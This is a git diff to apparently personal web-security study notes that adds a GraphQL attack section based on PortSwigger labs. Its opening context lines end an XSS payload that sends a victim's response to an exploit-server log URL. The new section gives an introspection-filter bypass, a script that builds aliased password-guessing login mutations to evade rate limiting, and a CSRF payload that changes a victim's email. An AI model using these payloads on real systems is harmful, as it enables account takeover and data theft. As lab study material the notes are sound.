@@ -120,3 +120,57 @@ req.withCredentials = true;req.send();function reqListener()
 {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1" </script>
 
 ```
+
+### GraphQL API Vulnerabilities
+
+GraphQL is an API Query Langauge that is designed to improve communication between the server and the browser by giving users exactly what they need, rather than massive objects which can be the case with REST APIs. I also have a blog post on GraphQL, check it out here: https://medium.com/@somi1403526/portswigger-exploiting-graphql-api-vulnerabilities-manual-way-burp-suite-community-version-29d3c5bcda6e
+
+**Step 1**: When it comes to exploiting GraphQL APIs first we need to identify GraphQL endpoints and upon doing so, to send a universal query  --> _query{__typename}_ and if GraphQL API is a valid endpoint indeed it will respond as: 
+```
+{"data": {"__typename": "query"}}
+```
+Common Endpoints Names are: 
+			• /graphql
+			• /api
+			• /api/graphql
+			• /graphql/api
+If these endpoints don't return anything, try appending /v1 for example to the path (tricks from the API enumeration)
+
+**Step 2**: Requests Methods ---> Once when we identify the GraphQL Endpoint, we want to try testing different HTTP Methods.
+Ideally, the app will only accept POST Methods with application/json content type for security reasons.
+But we can try sending a GET Request and a POST Request with an x-www-form-url-encoded Content-Type Header (more details in the Exploitation Section).
+
+**Step 3**: Understanding underlying schema using introspection queries. 
+Introspection is a built-in GraphQL function that lets us query information about schemas.
+Introspection can help us in enumerating and understanding GraphQL Endpoint but it can also disclose sensitive information such as description fields. Always check if the introspection is enabled as it can help a lot for discovering attack surface.
+_To Send an introspection query via Burp Pro, right-click on the Request send to GraphQL Endpoint -> GraphQL -> Send Introspection Query_
+
+Even if the introspection is unavailable, sometimes we can use suggestions to understand what we are dealing with.
+Suggestions are a feature of the Apollo GraphQL platform in which the server can suggest query amendments in error messages. These are generally used where a query is slightly incorrect but still recognizable (for example, There is no entry for 'productInfo'. Did you mean 'productInformation' instead?). Check more Hacktricks for more tips when introspection is disabled.
+
+## Exploitation
+
+**1)** If we find that the introspection is enabled, copy the Response from the introspection query and paste it to http://nathanrandal.com/graphql-visualizer/ . This will help us visualize possible queries and mutations that we can send to GraphQL API. This way we might find dangerous queries that can be executed, like in PortSwigger labs where we were able to find the query that displays the user's username and password by supplying the user ID as a variable.
+**2)** If we try sending an introspection query and we get an Error message saying that the introspection is disabled, that doesn't mean that we can't bypass this restriction if developers are relying only on weak regex behind the scenes. If they are using regex to exclude **__schema** keyword, we can trick the restriction it by sending a query that is little modified by having a newline character after __schema keyword (\n) -- if sending as part of GET request make sure to URL encode it - %0a!
+**3)** If the application is relying on the GraphQL Queries for sensitive functions such as Login and the application is properly protected against Brute-Force attacks by implementing Rate-Limiting for example, we can bypass this defense mechanism by using GraphQL aliases:  which are essentially large number of queries that we can send to the app in a single HTTP Request so we won't trigger Brute-Force Protection. For instance, let's continue with our example that app is implementing Login via GraphQL as in PortSwigger example, we can then in DevTools paste the following: 
+```
+copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>` bruteforce$index:login(input:{password: "$password", username: "carlos"}) { token success } `.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");![image](https://github.com/user-attachments/assets/835a5bd4-ffb1-423d-8f1f-ba090c795ad0)
+
+```
+which will essentially copy the bunch of queries (aliases) to our clipboard that we can all send **in single HTTP Request!** ultimately bypassing Brute-Forcing restriction
+In order to do so navigate to the Repeater and in the GraphQL Tab we can use mutation to send these aliases:
+```
+mutation{<OUR_QUERIES_HERE>}
+```
+**4)** Sometimes we can perform CSRF Over GraphQL Endpoints if they do not contain csrf token, the concept is the same as we are exploiting Regular CSRF vulnerability, but the approach is little different
+
+   **4.1)** First we need to check if the application is accepting x-www-form-urlencoded as a Content-Type Header we can check that by double-clicking Change Request Method in Burp, if the app is misconfigured we are lucky because this is a good sign that CRSF is exploitable
+   
+   **4.2)** Next, take the Original GraphQL query and paste in the body of POST request, URL-Encoded, for example consider the following query below from PortSwigger Lab that is used to change user's email address:
+```
+query=%0A++++mutation+changeEmail%28%24input%3A+
+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%
+7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=
+changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
+```
+As we can see Query doesn't have CSRF protection and the applications allow POST request via x-www-form-urlencoded as a Content-Type which makes CRSF exploitable and we can deliver this payload to the victim.
